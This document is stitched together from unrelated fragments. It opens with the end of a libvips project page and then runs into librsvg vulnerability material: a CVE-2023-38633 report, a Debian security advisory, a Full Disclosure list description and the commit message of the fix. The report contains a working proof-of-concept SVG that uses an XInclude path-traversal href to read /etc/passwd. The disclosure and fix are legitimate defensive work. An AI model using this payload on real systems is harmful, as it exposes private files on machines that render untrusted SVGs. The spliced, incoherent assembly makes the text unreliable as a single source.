[Lua](https://github.com/libvips/lua-vips), and
[Java](https://github.com/lopcode/vips-ffm). libvips
is used as an image processing engine by [sharp (on
node.js)](https://www.npmjs.org/package/sharp),
[bimg](https://github.com/h2non/bimg),
[sharp for Go](https://github.com/DAddYE/vips),
[Ruby on Rails](http://edgeguides.rubyonrails.org/active_storage_overview.html),
[carrierwave-vips](https://github.com/eltiare/carrierwave-vips),
[mediawiki](http://www.mediawiki.org/wiki/Extension%3AVipsScaler),
[PhotoFlow](https://github.com/aferrero2707/PhotoFlow) and others.
The official libvips GUI is [nip2](https://github.com/libvips/nip2),
a strange combination of a spreadsheet and an photo editor.

The [download area](https://github.com/libvips/libvips/releases) has the
source code plus pre-compiled binaries for Windows; you can install on macOS
with homebrew, MacPorts or Fink; and it’s available in most Linux package
managers. See the [install notes](install.html).

# CVE-2023-38633: Arbitrary file read when xinclude href has special characters

This is now CVE-2023-38633.

This was reported by Zac Sims.

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="300" height="300" style="fill:rgb(255,255,255);" />
  <text x="10" y="100">
    <xi:include href=".?../../../../../../../../../../etc/passwd" parse="text" encoding="UTF-8">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>
```

This ends up actually including the contents of /etc/passwd, bypassing the checks in `UrlResolver::resolve_href()`.

Analysis follows.

Package        : librsvg
CVE ID         : CVE-2023-38633
Debian Bug     : 1041810

Zac Sims discovered a directory traversal in the URL decoder of librsvg,
a SAX-based renderer library for SVG files, which could result in read
of arbitrary files when processing a specially crafted SVG file with an
include element.

For the oldstable distribution (bullseye), this problem has been fixed
in version 2.50.3+dfsg-1+deb11u1.

For the stable distribution (bookworm), this problem has been fixed in
version 2.54.7+dfsg-1~deb12u1.

We recommend that you upgrade your librsvg packages.

For the detailed security status of librsvg please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/librsvg>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

**[Full Disclosure](/fulldisclosure/)** — A public, vendor-neutral forum for detailed discussion of vulnerabilities and exploitation techniques, as well as tools, papers, news, and events of interest to the community. The relaxed atmosphere of this quirky list provides some comic relief and certain industry gossip. More importantly, fresh vulnerabilities sometimes hit this list many hours or days before they pass through the Bugtraq moderation queue.

In UrlResolver::resolve\_href() we now explicitly disallow URLs that
have a query string ("?") or a fragment identifier ("#").

We also explicitly check for a base URL and not resolving to a path,
for example, "<file:///base/foo.svg>" + "." would resolve to
"<file:///base/>" - this is technically correct, but we don't want to
resolve to directories.

Also, we pass a canonicalized path name as a URL upstream, so that
g\_file\_new\_from\_url() will consume it later, instead of passing the
original and potentially malicious URL.

Fixes [#996 (closed)](https://gitlab.gnome.org/GNOME/librsvg/-/issues/996 "CVE-2023-38633: Arbitrary file read when xinclude href has special characters")
